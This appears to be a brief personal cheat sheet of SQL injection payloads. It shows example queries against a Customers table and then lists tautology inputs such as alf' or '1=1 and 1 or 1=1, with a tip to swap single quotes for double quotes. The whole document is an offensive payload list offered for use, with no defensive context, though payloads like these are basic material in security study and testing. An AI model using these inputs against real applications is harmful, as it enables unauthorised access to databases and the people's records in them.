# Queries to Inject
```sql
SELECT * FROM Customers WHERE CustomerName LIKE '%alf%'
SELECT * FROM Customers WHERE CustomerName LIKE '%alf' or '1=1%' -- alf' or '1=1
SELECT * FROM Customers WHERE CustomerID =1 or 1=1 -- 1 or 1=1
SELECT * FROM Customers WHERE CustomerID ='1' or '1=1' -- 1' or '1=1
```
# So the payloads are 
alf' or '1=1
1 or 1=1
1' or '1=1

- and replace all the apostrophes with quotes(")